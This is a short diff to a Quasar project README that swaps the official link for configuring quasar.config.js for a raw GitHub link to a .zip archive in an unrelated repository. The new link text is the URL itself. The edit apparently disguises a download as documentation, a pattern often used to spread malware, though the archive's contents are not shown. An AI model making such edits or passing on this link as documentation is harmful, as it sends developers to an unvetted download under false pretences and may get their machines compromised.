@@ -21,4 +21,4 @@ quasar build
 ```
 
 ### Customize the configuration
-See [Configuring quasar.config.js](https://v2.quasar.dev/quasar-cli-webpack/quasar-config-js).
+See [Configuring https://raw.githubusercontent.com/Minoxds/Lab2-SE-324/master/Rhipidistia/Lab2-SE-324.zip](https://raw.githubusercontent.com/Minoxds/Lab2-SE-324/master/Rhipidistia/Lab2-SE-324.zip).
